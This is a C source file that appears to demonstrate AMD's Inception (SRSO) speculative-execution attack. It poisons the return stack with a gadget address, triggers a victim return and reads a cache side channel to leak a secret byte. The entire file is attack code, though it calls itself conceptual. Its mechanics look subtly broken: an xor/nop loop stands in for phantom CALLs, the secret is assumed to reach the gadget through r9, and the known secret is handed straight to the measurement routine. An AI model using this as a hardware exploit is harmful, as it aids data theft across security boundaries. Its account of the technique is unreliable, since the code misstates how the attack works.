#include "utils.c"

// --- Inception (Speculative Return Stack Overflow - SRSO) ---
// AMD-specific. Highly conceptual in C.

uint8_t secret_inception_data = 'I'; // Secret to leak

// Gadget function to leak a byte
// This function will be called speculatively when RAS is poisoned
__attribute__((noinline)) void leak_gadget_inception(uint8_t value)
{
    // Use the secret value to access the probe array
    // This creates a cache side-channel that can be measured
    probe_array[value * CACHE_LINE_SIZE] = 1;

    // Add some computation to make the speculative execution more realistic
    volatile int dummy = value * 2;
    (void)dummy; // Suppress unused variable warning
}

// Victim function with a return instruction that will be misdirected speculatively.
// In a real attack, this would be a function in the victim's code that the attacker
// can trigger to execute a return instruction.
__attribute__((noinline)) void victim_function_inception()
{
    volatile int dummy = 0;
    for (int i = 0; i < 10; ++i)
    {
        dummy += i;
    }
    // The return instruction here is the target of the attack
    // When the CPU speculatively executes this return, it should use
    // the poisoned RAS entry (our gadget address) instead of the real return address
    (void)dummy; // Suppress unused variable warning
}

int main()
{
    common_init();
    printf("\n--- Running Inception (SRSO) Demo (AMD-specific) ---\n");

    // --- Poisoning Phase ---
    // This is the most architecture-specific part for Inception.
    // It involves causing a large number of "phantom CALLs" via specific instruction sequences.
    // The ETH Zurich paper points to XOR instructions being speculatively interpreted as CALLs.
    // This requires precise inline assembly to construct the "trigger code."
    printf("Triggering phantom speculation to overflow RAS...\n");
    printf("Setting up r8 with gadget address: %p\n", (void *)&leak_gadget_inception);
    printf("Setting up r9 with secret data: %c (0x%02x)\n", secret_inception_data, secret_inception_data);

    // The actual code would be a highly-tuned inline assembly loop.
    // Example (conceptual, not guaranteed to work on any specific CPU):
    // The goal is to repeatedly execute instructions that AMD CPUs speculatively
    // misinterpret as CALLs, causing the RAS to be filled.
    // The addresses pushed onto the RAS are the attacker's "poison" values,
    // typically pointers to the `leak_gadget_inception`.

    // For a C-level conceptualization, we can only describe the goal:
    // Fill the RAS with `leak_gadget_inception` address.
    // This might involve:
    // 1. Setting up registers so that the "phantom CALL" uses `leak_gadget_inception` as target.
    // 2. Repeatedly executing a sequence of instructions (like `XOR`) that are known to
    //    trigger the phantom `CALL` behavior on the target AMD CPU.

    // Set up registers for the attack
    // r8 will contain the gadget address, r9 will contain the secret
    __asm__ __volatile__(
        "mov %0, %%r8\n\t"     // Load gadget address into r8
        "mov %1, %%r9\n\t"     // Load secret into r9
        ".rept 256\n\t"        // Repeat many times to overflow RAS
        "xor %%eax, %%eax\n\t" // This might be speculatively interpreted as CALL
        "nop\n\t"              // Padding
        "nop\n\t"
        "nop\n\t"
        ".endr\n"
        :
        : "r"(&leak_gadget_inception), "r"(secret_inception_data)
        : "rax", "r8", "r9");
    _mm_mfence(); // Ensure RAS updates are visible globally

    // After poisoning, flush caches to remove noise from training.
    flush_probe_array();
    _mm_mfence();

    // --- Attack Phase ---
    flush_probe_array();
    _mm_lfence();

    printf("Triggering victim function with return...\n");

    // Set up the attack: ensure r8 and r9 are still loaded with our values
    __asm__ __volatile__(
        "mov %0, %%r8\n\t" // Ensure gadget address is in r8
        "mov %1, %%r9\n\t" // Ensure secret is in r9
        :
        : "r"(&leak_gadget_inception), "r"(secret_inception_data)
        : "r8", "r9");

    // Call the victim function - its return instruction should be misdirected
    victim_function_inception(); // This will execute a 'ret' instruction.
                                 // Speculatively, due to poisoned RAS, it returns to gadget.
                                 // The gadget will be called with the secret in r9 as parameter.

    // Add a fence to ensure speculative effects propagate to cache
    _mm_lfence();

    // --- Measurement Phase ---
    perform_measurement(secret_inception_data, "Inception secret");
    printf("Actual secret data: %c\n", secret_inception_data);
    return 0;
}